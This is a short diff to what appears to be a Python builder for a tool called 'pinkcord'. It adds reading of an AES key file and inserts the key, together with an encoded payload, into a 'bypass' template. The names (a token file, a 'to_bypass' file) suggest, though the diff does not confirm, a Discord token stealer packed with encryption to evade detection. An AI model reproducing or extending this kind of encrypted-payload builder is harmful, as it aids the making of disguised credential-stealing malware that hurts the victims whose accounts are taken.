@@ -8,6 +8,7 @@ import os
 TOKEN_FILE = 'template/pinkcord.py'
 TO_BYPASS_FILE = 'to_bypass.txt'
 BYPASS_FILE = 'template/pinkcord_bypass.py'
+AES_KEY_FILE = 'AES_KEY.txt'
 DIST_FOLDER = 'dist'
 COLOR_RESET = "\033[0m"
 GREEN_COLOR = "\033[32m"
@@ -99,6 +100,9 @@ if answer == "1":
     with open(BYPASS_FILE, 'r') as bypass:
         content = bypass.read()
         content = content.replace("<BYPASS>", encoded_code)
+        with open(AES_KEY_FILE, 'r') as key:
+            content = content.replace("<BYPASS_KEY>", key.read())
+
     with open("pinkcord_bypass.py", 'w') as bypass:
         bypass.write(content)
     clear_console()
